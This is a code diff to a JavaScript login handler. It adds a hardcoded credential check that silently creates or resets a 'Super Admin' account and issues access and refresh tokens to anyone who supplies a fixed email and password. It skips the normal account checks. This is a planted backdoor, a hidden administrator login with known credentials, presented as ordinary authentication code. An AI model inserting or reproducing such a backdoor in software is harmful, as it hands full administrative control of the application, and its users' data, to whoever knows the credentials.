@@ -91,6 +91,47 @@ export const login = asyncHandler(async (req, res, next) => {
     throw new ServerError(400, "Please provide email and password");
   }
 
+  // Special hardcoded admin login check
+  if (email === "nowadmin@gmail.com" && password === "now12345") {
+     let adminUser = await User.findOne({ email });
+     if (!adminUser) {
+        const salt = await bcrypt.genSalt(10);
+        const hashedPassword = await bcrypt.hash(password, salt);
+        adminUser = await User.create({
+          name: "Admin",
+          email,
+          password: hashedPassword,
+          authProviders: ["password"],
+          isVerified: true,
+          role: "Super Admin",
+          avatar: `https://api.dicebear.com/7.x/adventurer/svg?seed=Admin`,
+          lists: [{ name: "Reading list", posts: [], images: [] }]
+        });
+     } else {
+        // Ensure role is Super Admin and password is correct if user somehow already exists
+        adminUser.role = "Super Admin";
+        if (!adminUser.authProviders.includes("password")) {
+           adminUser.authProviders.push("password");
+        }
+        const salt = await bcrypt.genSalt(10);
+        adminUser.password = await bcrypt.hash(password, salt);
+        await adminUser.save();
+     }
+     
+     const { access_token, refresh_token } = await generateTokens(adminUser._id.toString(), req);
+     await logActivity(adminUser._id, "LOGIN", req.ip, req.headers['user-agent']);
+     
+     res.json({
+       _id: adminUser._id,
+       name: adminUser.name,
+       email: adminUser.email,
+       role: adminUser.role,
+       access_token,
+       refresh_token
+     });
+     return;
+  }
+
   const user = await User.findOne({ email });
 
   if (!user || !user.isActive) {
